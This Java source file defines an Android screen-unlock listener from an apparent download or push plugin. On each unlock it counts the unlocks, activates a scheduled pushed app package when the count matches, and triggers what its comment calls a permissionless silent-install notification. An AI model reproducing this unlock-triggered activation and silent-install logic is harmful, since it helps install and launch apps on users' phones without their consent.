package com.tiho.dlplugin.task.scheduleact;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;

import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.bean.ScheduleActivationBean;
import com.tiho.dlplugin.task.activate.ActivateUtil;
import com.tiho.dlplugin.task.silent.SilentInstallHelper;
import com.tiho.dlplugin.util.NetworkUtil;

import java.util.concurrent.atomic.AtomicInteger;

/**
 * 屏幕点亮监听
 *
 * @author Joey.Dai
 */
public class ScreenListener extends BroadcastReceiver {
    private Handler mHandler;
    private Context mContext;
    public ScreenListener(Handler handler,Context context) {
        mHandler=handler;
        mContext=context;
    }

    private AtomicInteger count = new AtomicInteger(0);

    @Override
    public void onReceive(Context context, Intent intent) {
        LogManager.LogShow("Screen ON:" + intent.getAction() + ",count=" + count);

        if (intent.getAction().equals(Intent.ACTION_USER_PRESENT)) {
            int now = count.incrementAndGet();
            final ScheduleActivationBean bean = ScheduleActList.getInstance(context).isHit(now);
            LogManager.LogShow("target:" + bean);
            boolean network = NetworkUtil.isNetworkOk(context);
            if (bean != null) {
                ActivateUtil.activate(context, bean.getPushId(), bean.getPackName(), bean.isFromSilent(), network);
                // 点亮次数重置
                count.set(0);
            }
            // 屏幕点亮推一个无权静默安装的静默消息
            SilentInstallHelper.getInstance(context).showSilentNotification();
        }
    }


}
